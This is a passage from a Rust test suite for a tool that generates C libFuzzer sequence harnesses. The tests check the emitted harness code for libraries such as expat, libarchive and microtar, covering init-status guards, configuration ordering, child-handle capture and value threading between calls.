            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn status_int_return_is_recognized_for_init_guard() {
        // #12: only a bare signed-int (0==success) return guards the op-loop.
        assert!(c_type_is_status_int("int"));
        assert!(c_type_is_status_int("int32_t"));
        assert!(c_type_is_status_int(" long "));
        // A pointer/handle/unsigned/void return is NOT a 0==success status.
        assert!(!c_type_is_status_int("void"));
        assert!(!c_type_is_status_int("mtar_t *"));
        assert!(!c_type_is_status_int("char *"));
        assert!(!c_type_is_status_int("unsigned"));
        assert!(!c_type_is_status_int("size_t"));
    }

    #[test]
    fn mined_protocol_keeps_stream_then_finalize_calls_and_safe_literals() {
        let out = temp_dir("seq-mined-protocol");
        let parse_step = CLifecycleStep {
            name: "XML_Parse".to_owned(),
            params: vec![
                CParameter {
                    name: "data".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "size".to_owned(),
                    c_type: "int".to_owned(),
                },
                CParameter {
                    name: "is_final".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            role: CStepRole::Operation,
        };
        let reset_step = CLifecycleStep {
            name: "XML_ParserReset".to_owned(),
            params: vec![CParameter {
                name: "encoding".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "int".to_owned(),
            role: CStepRole::Operation,
        };
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-PROTOCOL".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/xmlparse.c"),
            target: cfunction("XML_Parse"),
            handle_type: "XML_Parser".to_owned(),
            handle_param_type: "XML_Parser".to_owned(),
            init_returns_handle: true,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "XML_ParserCreate".to_owned(),
                params: vec![CParameter {
                    name: "encoding".to_owned(),
                    c_type: "const char *".to_owned(),
                }],
                return_type: "XML_Parser".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![parse_step.clone()],
            protocol_steps: vec![
                CProtocolStep {
                    step: parse_step.clone(),
                    args: vec![
                        CProtocolArg::InputData,
                        CProtocolArg::InputSize,
                        CProtocolArg::Literal("0".to_owned()),
                    ],
                    has_receiver: true,
                    marks_target: true,
                    condition: None,
                    input_condition: None,
                },
                CProtocolStep {
                    step: parse_step,
                    args: vec![
                        CProtocolArg::InputData,
                        CProtocolArg::InputSize,
                        CProtocolArg::Literal("1".to_owned()),
                    ],
                    has_receiver: true,
                    marks_target: true,
                    condition: None,
                    input_condition: None,
                },
                CProtocolStep {
                    step: CLifecycleStep {
                        name: "XML_GetErrorCode".to_owned(),
                        params: Vec::new(),
                        return_type: "enum XML_Error".to_owned(),
                        role: CStepRole::Operation,
                    },
                    args: Vec::new(),
                    has_receiver: true,
                    marks_target: false,
                    condition: Some(CProtocolCondition {
                        producer_step: 1,
                        bitmask: None,
                        comparison: CProtocolComparison::Equal,
                        value: "XML_STATUS_ERROR".to_owned(),
                    }),
                    input_condition: None,
                },
                CProtocolStep {
                    step: CLifecycleStep {
                        name: "XML_ErrorString".to_owned(),
                        params: vec![CParameter {
                            name: "code".to_owned(),
                            c_type: "enum XML_Error".to_owned(),
                        }],
                        return_type: "const char *".to_owned(),
                        role: CStepRole::Operation,
                    },
                    args: vec![CProtocolArg::PriorResult(2)],
                    has_receiver: false,
                    marks_target: false,
                    condition: Some(CProtocolCondition {
                        producer_step: 1,
                        bitmask: None,
                        comparison: CProtocolComparison::Equal,
                        value: "XML_STATUS_ERROR".to_owned(),
                    }),
                    input_condition: None,
                },
                CProtocolStep {
                    step: CLifecycleStep {
                        name: "XML_GetCurrentLineNumber".to_owned(),
                        params: Vec::new(),
                        return_type: "long".to_owned(),
                        role: CStepRole::Operation,
                    },
                    args: Vec::new(),
                    has_receiver: true,
                    marks_target: false,
                    condition: None,
                    input_condition: None,
                },
                CProtocolStep {
                    step: reset_step,
                    args: vec![CProtocolArg::Literal("NULL".to_owned())],
                    has_receiver: true,
                    marks_target: false,
                    condition: None,
                    input_condition: Some(CProtocolInputCondition {
                        source: CProtocolInputSource::Size,
                        transform: CProtocolInputTransform::Modulo(2),
                        comparison: CProtocolComparison::NotEqual,
                        value: "0".to_owned(),
                    }),
                },
            ],
            protocol_objects: vec![CProtocolObject {
                constructor: CLifecycleStep {
                    name: "XML_ParserCreateNS".to_owned(),
                    params: vec![
                        CParameter {
                            name: "encoding".to_owned(),
                            c_type: "const char *".to_owned(),
                        },
                        CParameter {
                            name: "separator".to_owned(),
                            c_type: "char".to_owned(),
                        },
                    ],
                    return_type: "XML_Parser".to_owned(),
                    role: CStepRole::Open,
                },
                args: vec![
                    CProtocolArg::Literal("NULL".to_owned()),
                    CProtocolArg::Literal("'!'".to_owned()),
                ],
                uses_primary_as_parent: false,
            }],
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "XML_ParserFree".to_owned(),
                params: Vec::new(),
                return_type: "void".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["expat.h".to_owned()],
            target_includes_dirs: Vec::new(),
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
        };

        let generated = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(generated.main_c).unwrap();
        assert!(main.contains("Project-mined expert protocol"), "{main}");
        assert!(
            main.contains("_gf_protocol0_result = XML_Parse(_gf_handle"),
            "{main}"
        );
        assert!(
            main.contains("_gf_protocol1_result = XML_Parse(_gf_handle"),
            "{main}"
        );
        assert!(main.contains(", 0);"), "{main}");
        assert!(main.contains(", 1);"), "{main}");
        assert!(
            main.contains("XML_GetCurrentLineNumber(_gf_handle)"),
            "{main}"
        );
        assert!(
            main.contains("XML_ErrorString(_gf_protocol2_result)"),
            "{main}"
        );
        assert!(
            main.contains("if (_gf_protocol1_result == XML_STATUS_ERROR)"),
            "{main}"
        );
        assert!(main.contains("XML_ParserReset(_gf_handle, NULL)"), "{main}");
        assert!(
            main.contains("if (((uint64_t)Cur.size % 2u) != 0)"),
            "input-dependent expert guard must survive emission: {main}"
        );
        assert!(
            main.contains("XML_Parser _gf_protocol_object0 = XML_ParserCreateNS(NULL, '!')"),
            "{main}"
        );
        assert!(
            main.contains("XML_Parse(_gf_protocol_object0"),
            "the mined namespace object must run the same parse protocol: {main}"
        );
        assert!(
            main.contains("_gf_protocol_lane == 1")
                && main.contains("gf_cursor Cur = gf_open_data(Data, Size, 42)"),
            "additional topologies must become ranked, control-separated lanes: {main}"
        );
        let portfolio = fs::read_to_string(out.join(PROTOCOL_PORTFOLIO_FILE)).unwrap();
        assert!(portfolio.contains("ranked_specialized_protocol_lanes"));
        assert!(portfolio.contains("XML_ParserCreateNS"));
        assert!(
            main.contains("XML_ParserFree(_gf_protocol_object0)"),
            "the additional object must be released: {main}"
        );
        assert!(
            main.contains("switch ((int)gf_ctrl_op"),
            "a reset-terminated expert prefix should compose with random exploration: {main}"
        );
    }

    #[test]
    fn sequence_harness_guards_oploop_and_teardown_on_init_status() {
        // Campaign #12: microtar's `int mtar_open(mtar_t*, const char*, const char*)`
        // returns a status; on a failed open (fuzzed nonexistent path) the handle's
        // stream is NULL, so an unconditional op-loop + teardown fclose(NULL)s ->
        // SEGV, and a self-closed handle double-frees. The op-loop AND the end-step
        // teardown must run only when the constructor succeeded (status == 0).
        let out = temp_dir("seq-guard");
        let header_source = r#"
            typedef struct mtar_t { void *stream; int pos; } mtar_t;
            int mtar_open(mtar_t *tar, const char *filename, const char *mode);
            int mtar_read(mtar_t *tar, unsigned size);
            int mtar_close(mtar_t *tar);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-MTAR".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/microtar.c"),
            target: cfunction("mtar_read"),
            handle_type: "mtar_t".to_owned(),
            handle_param_type: "mtar_t *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "mtar_open".to_owned(),
                params: vec![
                    CParameter {
                        name: "filename".to_owned(),
                        c_type: "const char *".to_owned(),
                    },
                    CParameter {
                        name: "mode".to_owned(),
                        c_type: "const char *".to_owned(),
                    },
                ],
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }),
            op_steps: vec![CLifecycleStep {
                name: "mtar_read".to_owned(),
                params: vec![CParameter {
                    name: "size".to_owned(),
                    c_type: "unsigned".to_owned(),
                }],
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "mtar_close".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }),
            target_includes: vec!["microtar.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/microtar.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        let run_one_decl = main
            .find("int govfuzz_run_one(const uint8_t *Data, size_t Size);")
            .expect("sequence driver needs a prototype under -Wmissing-prototypes");
        let run_one_def = main
            .find("int govfuzz_run_one(const uint8_t *Data, size_t Size) {")
            .expect("sequence driver definition");
        let libfuzzer_decl = main
            .find("int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);")
            .expect("libFuzzer entry needs a prototype under -Wmissing-prototypes");
        assert!(run_one_decl < run_one_def && libfuzzer_decl < run_one_def);
        let guard = main
            .find("if (_gf_init_result == 0) {")
            .expect("op-loop must be guarded on constructor success");
        let loop_pos = main.find("_gf_lifecycle_count").unwrap();
        let close_pos = main.find("mtar_close(&_gf_handle)").unwrap();
        assert!(
            guard < loop_pos,
            "op-loop must be inside the success guard: {main}"
        );
        assert!(
            guard < close_pos,
            "teardown must be inside the success guard: {main}"
        );
        // A plain signed integer returned by an ordinary operation is often
        // positive progress, not a 0==success status (`read`, parser enums).
        // Do not terminate the sequence merely because it is nonzero.
        assert!(
            !main.contains("if (_gf_step0_result != 0) {"),
            "an ordinary integer result must not be treated as a status: {main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn configuration_runs_between_construction_and_use() {
        // libarchive's own tests call `archive_read_support_format_all`
        // immediately after `archive_read_new` — without it the reader supports
        // NOTHING and every input dies at the first header. A fuzzed op program
        // performs that step only by luck, so most executions never reach the
        // code the target exists to run. Measured on expat, installing handlers
        // was worth +323 library lines.
        let out = temp_dir("seq-config");
        let header_source = r#"
            typedef struct arc { int fmt; } arc;
            typedef void (*arc_handler)(void *opaque);
            int arc_new(arc *a);
            int arc_support_format_all(arc *a);
            void arc_set_handler(arc *a, arc_handler handler);
            void arc_set_user_data(arc *a, void *opaque);
            int arc_stop(arc *a, int resumable);
            int arc_next_header(arc *a, unsigned n);
            int arc_free(arc *a);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-ARCCFG".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/arc.c"),
            target: cfunction("arc_next_header"),
            handle_type: "arc".to_owned(),
            handle_param_type: "arc *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: vec![
                CHandleFieldInitializer {
                    field: "fmt".to_owned(),
                    value: "7".to_owned(),
                },
                CHandleFieldInitializer {
                    field: "not_declared".to_owned(),
                    value: "9".to_owned(),
                },
            ],
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "arc_new".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                CLifecycleStep {
                    name: "arc_next_header".to_owned(),
                    params: vec![CParameter {
                        name: "n".to_owned(),
                        c_type: "unsigned".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "arc_support_format_all".to_owned(),
                    params: Vec::new(),
                    return_type: "int".to_owned(),
                    role: CStepRole::Configure,
                },
                CLifecycleStep {
                    name: "arc_set_handler".to_owned(),
                    params: vec![CParameter {
                        name: "handler".to_owned(),
                        c_type: "arc_handler".to_owned(),
                    }],
                    return_type: "void".to_owned(),
                    role: CStepRole::Configure,
                },
                CLifecycleStep {
                    name: "arc_set_user_data".to_owned(),
                    params: vec![CParameter {
                        name: "opaque".to_owned(),
                        c_type: "void *".to_owned(),
                    }],
                    return_type: "void".to_owned(),
                    role: CStepRole::Configure,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: vec!["arc_set_user_data".to_owned()],
            callback_action: Some(CCallbackAction {
                step: CLifecycleStep {
                    name: "arc_stop".to_owned(),
                    params: vec![CParameter {
                        name: "resumable".to_owned(),
                        c_type: "int".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                alternative_steps: Vec::new(),
                configuration_name: "arc_set_handler".to_owned(),
                configuration_arg: 0,
            }),
            end_step: Some(CLifecycleStep {
                name: "arc_free".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["arc.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/arc.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let main = fs::read_to_string(&generate_c_sequence_harness(args).unwrap().main_c).unwrap();

        let initialized = main
            .find("_gf_handle.fmt = 7;")
            .expect("maintained public-field precondition must be emitted");
        assert!(initialized < main.find("arc_new(&_gf_handle)").unwrap());
        assert!(!main.contains("_gf_handle.not_declared"));

        // Configuration is unconditional, and sits after construction but before
        // the op loop.
        let configured = main
            .find("arc_support_format_all(&_gf_handle)")
            .expect("configuration must be emitted");
        let constructed = main.find("arc_new(&_gf_handle)").expect("constructor");
        let loop_start = main.find("_gf_lifecycle_count").expect("op loop");
        assert!(
            constructed < configured && configured < loop_start,
            "configuration must run between construction and the op loop:\n{main}"
        );
        // It is deliberately not repeated as a fuzz-selected op: pointer-valued
        // setters borrow stable storage through teardown, while a case-local
        // allocation would become dangling as soon as that switch arm exits.
        assert!(
            main.matches("arc_support_format_all(").count() == 1,
            "configuration must run exactly once from stable setup storage:\n{main}"
        );
        assert!(
            main.contains("static void _gf__gf_cfg1_handler_trampoline(void *opaque)"),
            "unconditional callback configuration needs its own trampoline support:\n{main}"
        );
        assert!(
            main.contains("arc_set_user_data(&_gf_handle, &_gf_handle)"),
            "an expert receiver-as-user-data recipe must retain the live handle:\n{main}"
        );
        assert!(
            !main.contains("free(_gf_cfg2_opaque)"),
            "receiver-bound user data is owned by the lifecycle, not decoder storage:\n{main}"
        );
        assert!(
            main.contains("GOVFUZZ_CALLBACK_OBSERVE(opaque)")
                && main.contains("(void)arc_stop((arc *)context"),
            "a registered callback action must be bounded and input-controlled:\n{main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn libarchive_memory_reader_uses_the_expert_nested_drain_protocol() {
        let out = temp_dir("seq-libarchive-pump");
        let header_source = r#"
            struct archive;
            struct archive_entry;
            typedef long la_ssize_t;
            struct archive *archive_read_new(void);
            int archive_read_support_filter_all(struct archive *);
            int archive_read_support_format_all(struct archive *);
            int archive_read_set_format(struct archive *, int);
            int archive_read_open_memory(struct archive *, const void *, size_t);
            int archive_read_next_header(struct archive *, struct archive_entry **);
            la_ssize_t archive_read_data(struct archive *, void *, size_t);
            int archive_read_data_skip(struct archive *);
            int archive_read_free(struct archive *);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-LIBARCHIVE".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/archive_read.c"),
            target: cfunction("archive_read_open_memory"),
            handle_type: "struct archive *".to_owned(),
            handle_param_type: "struct archive *".to_owned(),
            init_returns_handle: true,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "archive_read_new".to_owned(),
                params: Vec::new(),
                return_type: "struct archive *".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                CLifecycleStep {
                    name: "archive_read_open_memory".to_owned(),
                    params: vec![
                        CParameter {
                            name: "arg1".to_owned(),
                            c_type: "const void *".to_owned(),
                        },
                        CParameter {
                            name: "arg2".to_owned(),
                            c_type: "size_t".to_owned(),
                        },
                    ],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "archive_read_next_header".to_owned(),
                    params: vec![CParameter {
                        name: "arg1".to_owned(),
                        c_type: "struct archive_entry **".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "archive_read_data".to_owned(),
                    params: vec![
                        CParameter {
                            name: "arg1".to_owned(),
                            c_type: "void *".to_owned(),
                        },
                        CParameter {
                            name: "arg2".to_owned(),
                            c_type: "size_t".to_owned(),
                        },
                    ],
                    return_type: "la_ssize_t".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "archive_read_data_skip".to_owned(),
                    params: Vec::new(),
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "archive_read_support_filter_all".to_owned(),
                    params: Vec::new(),
                    return_type: "int".to_owned(),
                    role: CStepRole::Configure,
                },
                CLifecycleStep {
                    name: "archive_read_support_format_all".to_owned(),
                    params: Vec::new(),
                    return_type: "int".to_owned(),
                    role: CStepRole::Configure,
                },
                CLifecycleStep {
                    name: "archive_read_set_format".to_owned(),
                    params: vec![CParameter {
                        name: "format".to_owned(),
                        c_type: "int".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Configure,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "archive_read_free".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["archive.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/archive_read.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let mut wide_args = args.clone();
        let generated = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&generated.main_c).unwrap();
        let layout = fs::read_to_string(out.join(SEQUENCE_LAYOUT_FILE)).unwrap();
        let portfolio = fs::read_to_string(out.join(PROTOCOL_PORTFOLIO_FILE)).unwrap();

        let configured = main.find("archive_read_support_format_all").unwrap();
        let opened = main.find("archive_read_open_memory(_gf_handle").unwrap();
        let header = main.find("archive_read_next_header(_gf_handle").unwrap();
        let data = main.find("archive_read_data(_gf_handle").unwrap();
        let freed = main.rfind("archive_read_free(_gf_handle").unwrap();
        assert!(configured < opened && opened < header && header < data && data < freed);
        assert!(
            !main.contains("archive_read_set_format("),
            "the expert all-format setup must not be undone by an unconstrained format selector:\n{main}"
        );
        assert!(main.contains("_gf_entry_index < 256"), "{main}");
        assert!(main.contains("_gf_data_index < 4096"), "{main}");
        assert!(main.contains("== ARCHIVE_RETRY"), "{main}");
        assert!(main.contains("== ARCHIVE_FATAL"), "{main}");
        assert!(
            main.contains("_gf_stream_lane") && main.contains("archive_read_data_skip(_gf_handle)"),
            "the reader portfolio must preserve both valid skip and drain semantics:\n{main}"
        );
        assert!(layout.contains("\"portfolio_lanes\": 2"), "{layout}");
        assert!(
            portfolio.contains("stream_drain") && portfolio.contains("stream_skip"),
            "{portfolio}"
        );
        assert!(
            main.contains("const void * _gf_step0_arg1 = (const void *)Data")
                && main.contains("size_t _gf_step0_arg2 = (size_t)Size"),
            "the unnamed memory-image pointer and length must describe the same fuzz span:\n{main}"
        );
        assert!(
            !main.contains("_gf_lifecycle_count"),
            "the proven reader protocol must replace random call ordering:\n{main}"
        );
        assert!(
            main.contains("unsigned char _gf_archive_data_buffer[4096]")
                && main.contains(
                    "archive_read_data(_gf_handle, _gf_archive_data_buffer, sizeof(_gf_archive_data_buffer))"
                )
                && !main.contains("malloc(_gf_cap__gf_step2_arg1"),
            "the expert drain should reuse one fixed scratch buffer instead of allocating per read:\n{main}"
        );

        wide_args.harness_id = "H-LIBARCHIVE-WIDE".to_owned();
        wide_args.target = cfunction("archive_read_open_filenames_w");
        wide_args.op_steps[0].name = "archive_read_open_filenames_w".to_owned();
        wide_args.op_steps[0].params = vec![
            CParameter {
                name: "wfilenames".to_owned(),
                c_type: "const wchar_t **".to_owned(),
            },
            CParameter {
                name: "block_size".to_owned(),
                c_type: "size_t".to_owned(),
            },
        ];
        let wide =
            fs::read_to_string(&generate_c_sequence_harness(wide_args).unwrap().main_c).unwrap();
        assert!(wide.contains("archive_read_support_filter_all(_gf_handle)"));
        assert!(wide.contains("archive_read_support_format_all(_gf_handle)"));
        assert!(wide.contains("const wchar_t *_gf_paths__gf_step0_wfilenames[2]"));
        assert!(wide.contains("archive_read_open_filenames_w(_gf_handle"));
        assert!(wide.contains("archive_read_next_header(_gf_handle"));
        assert!(wide.contains("archive_read_data(_gf_handle"));
        assert!(
            !wide.contains("_gf_lifecycle_count"),
            "every exact libarchive reader variant must use the proven drain protocol:\n{wide}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn an_op_returning_a_child_handle_lets_later_ops_drive_the_child() {
        // libexpat's `XML_ExternalEntityParserCreate(parentParser, ...)` builds a
        // child parser from a STILL-LIVE parent, and the DTD/entity subsystem is
        // reachable only through that child. In the ablation this was worth +594
        // library lines on expat — more than any other single technique — and
        // without it the harness only ever drives the object it constructed.
        let out = temp_dir("seq-derived");
        let header_source = r#"
            typedef struct parser { int depth; } parser;
            int parser_init(parser *p);
            int parser_feed(parser *p, unsigned byte);
            parser *parser_child(parser *p, unsigned kind);
            int parser_free(parser *p);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let arg = |name: &str| CParameter {
            name: name.to_owned(),
            c_type: "unsigned".to_owned(),
        };
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-PARSER".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/parser.c"),
            target: cfunction("parser_feed"),
            handle_type: "parser".to_owned(),
            handle_param_type: "parser *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "parser_init".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                CLifecycleStep {
                    name: "parser_feed".to_owned(),
                    params: vec![arg("byte")],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "parser_child".to_owned(),
                    params: vec![arg("kind")],
                    return_type: "parser *".to_owned(),
                    // Real APIs commonly call this Create/New; it must still be
                    // treated as a derived producer while the parent is live.
                    role: CStepRole::Open,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "parser_free".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["parser.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/parser.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let main = fs::read_to_string(&generate_c_sequence_harness(args).unwrap().main_c).unwrap();

        assert!(
            main.contains("parser * _gf_derived = 0;")
                && main.contains("int _gf_derived_live = 0;"),
            "a derived slot must exist:\n{main}"
        );
        // The producer stores the child — but only a non-NULL one, since the
        // API is entitled to decline and driving NULL would be our own bug.
        assert!(
            main.contains("_gf_derived = _gf_step1_result;")
                && main.contains("_gf_derived_live = 1;"),
            "the child must be captured:\n{main}"
        );
        assert!(
            main.contains("if (_gf_step1_result) {"),
            "a NULL child must not be captured:\n{main}"
        );
        assert!(
            !main.contains("if (_gf_handle_live) { break; }"),
            "a derived producer must run on a live parent, not be gated as a primary reopen:\n{main}"
        );
        // ...and later ops can be driven against it instead of the parent.
        assert!(
            main.contains("? _gf_derived : &_gf_handle"),
            "ops must be able to run on the child:\n{main}"
        );
        assert!(
            main.contains("parser_feed(((_gf_derived_live"),
            "the target op itself must reach the child:\n{main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn an_ops_return_value_can_become_a_later_ops_argument() {
        // `id = add(x); remove(id); get(id)` — use-after-remove and off-by-one
        // index bugs need the sequence to CONSUME a value it produced. With every
        // argument decoded fresh from the input, that whole class is unreachable
        // by construction.
        let out = temp_dir("seq-thread");
        let header_source = r#"
            typedef struct pool { int n; } pool;
            typedef unsigned long pool_id;
            int pool_init(pool *p);
            pool_id pool_add(pool *p, unsigned value);
            int pool_remove(pool *p, pool_id id);
            int pool_free(pool *p);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-POOL".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/pool.c"),
            target: cfunction("pool_add"),
            handle_type: "pool".to_owned(),
            handle_param_type: "pool *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "pool_init".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                // Returns an ID, not a 0==success status. A bare `int` return is
                // treated as a status code and deliberately NOT threaded — the
                // loop already gates on it, and feeding a success code back in
                // as an argument would be noise.
                CLifecycleStep {
                    name: "pool_add".to_owned(),
                    params: vec![CParameter {
                        name: "value".to_owned(),
                        c_type: "unsigned".to_owned(),
                    }],
                    return_type: "pool_id".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "pool_remove".to_owned(),
                    params: vec![CParameter {
                        name: "id".to_owned(),
                        c_type: "pool_id".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "pool_free".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["pool.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/pool.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let main = fs::read_to_string(&generate_c_sequence_harness(args).unwrap().main_c).unwrap();

        // A slot exists for the produced type, and the producer stores into it.
        assert!(
            main.contains("pool_id _gf_slot_pool_id;"),
            "slot declared:\n{main}"
        );
        assert!(
            main.contains("_gf_slot_pool_id = _gf_step0_result;")
                && main.contains("_gf_slot_pool_id_live = 1;"),
            "the producer must store its result:\n{main}"
        );
        // The consumer can take the slot instead of a freshly decoded value...
        assert!(
            main.contains("_gf_slot_pool_id_live && ") && main.contains("? _gf_slot_pool_id :"),
            "the consumer must be able to take the threaded value:\n{main}"
        );
        // ...but never before something has stored one, and the fresh decode is
        // still there as the alternative.
        assert!(
            main.contains("_gf_step1_id = "),
            "the fresh decode must remain as the other branch:\n{main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn open_and_close_ops_cycle_the_handle_without_use_after_close() {
        // libarchive's shape: `archive_read_new` is the constructor, but
        // `archive_read_open_memory` is ALSO an open verb and used to be filtered
        // out of the alphabet with it, so the harness could never open anything.
        // Keeping it as an op — gated on liveness — reaches close/reopen and
        // re-init-over-live-state without ever driving an ordinary op on a
        // closed handle, which would be API misuse rather than a library bug.
        let out = temp_dir("seq-cycle");
        let header_source = r#"
            typedef struct arc { void *stream; int pos; } arc;
            int arc_new(arc *a);
            int arc_open_memory(arc *a, unsigned size);
            int arc_next_header(arc *a, unsigned n);
            int arc_close(arc *a);
            int arc_free(arc *a);
        "#;
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let step = |name: &str, role: CStepRole| CLifecycleStep {
